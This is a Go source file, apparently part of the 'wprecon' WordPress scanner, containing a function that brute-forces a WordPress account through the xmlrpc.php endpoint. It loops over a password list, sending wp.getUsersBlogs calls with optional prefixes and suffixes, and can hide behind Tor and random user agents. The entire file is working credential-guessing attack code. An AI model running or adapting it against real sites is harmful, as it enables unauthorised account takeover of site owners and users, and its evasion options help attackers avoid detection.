package fuzzing

import (
	"fmt"
	"strings"

	"github.com/blackbinn/wprecon/internal/database"
	"github.com/blackbinn/wprecon/pkg/gohttp"
	"github.com/blackbinn/wprecon/pkg/printer"
)

func XMLRPC(channel chan [2]int, username string, passwords []string) {
	http := gohttp.NewHTTPClient()
	http.SetMethod("POST")
	http.SetURL(database.Memory.GetString("Target"))
	http.SetURLDirectory("xmlrpc.php")
	http.OnTor(database.Memory.GetBool("HTTP Options TOR"))
	http.OnRandomUserAgent(database.Memory.GetBool("HTTP Options Random Agent"))
	http.OnTLSCertificateVerify(database.Memory.GetBool("HTTP Options TLS Certificate Verify"))
	http.FirewallDetection(true)

	var pprefix = database.Memory.GetString("Passwords Prefix")
	var psuffix = database.Memory.GetString("Passwords Suffix")

	for count, password := range passwords {
		http.SetData(fmt.Sprintf(`<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>`, username, pprefix+password+psuffix))

		response, err := http.Run()

		if err != nil {
			printer.Danger(fmt.Sprintf("%s", err))
		}

		if containsAdmin := strings.Contains(strings.ToLower(response.Raw), "admin"); containsAdmin {
			channel <- [2]int{1, count}
			break
		} else if 1+count == len(passwords) {
			channel <- [2]int{0, count}
			break
		} else {
			channel <- [2]int{0, count}
		}
	}
}
